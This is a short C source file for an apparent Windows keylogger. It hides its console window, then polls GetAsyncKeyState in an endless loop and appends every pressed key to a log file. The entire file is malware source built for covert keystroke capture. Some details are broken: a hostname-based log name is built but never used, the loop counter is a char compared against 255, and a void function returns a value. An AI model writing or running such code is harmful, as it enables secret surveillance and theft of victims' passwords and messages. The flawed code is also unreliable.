#include <stdio.h>
#include <windows.h>

#include "keylogger_windows.h"


void hideConsole() {
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}

void script_windows(char* hostname) {
    hideConsole(); // Hide console window

    char key;
    FILE *logfile;
   	char logFileName[300]; // hostname < 256chars
    snprintf(logFileName, sizeof(logFileName), "%s.txt", hostname);
	logfile = fopen("log.txt", "a"); // Open log file for appending
	while (1) {
        Sleep(10); // Sleep for a short interval to reduce CPU usage
        // Check if any key is pressed
        for (key = 8; key <= 255; key++){
            if (GetAsyncKeyState(key) == -32767) {
            	// Log the key to the file
            	fprintf(logfile, "%c", key);
       		}
    	}
	}
    fclose(logfile); // Close the log file
    return 0;
}
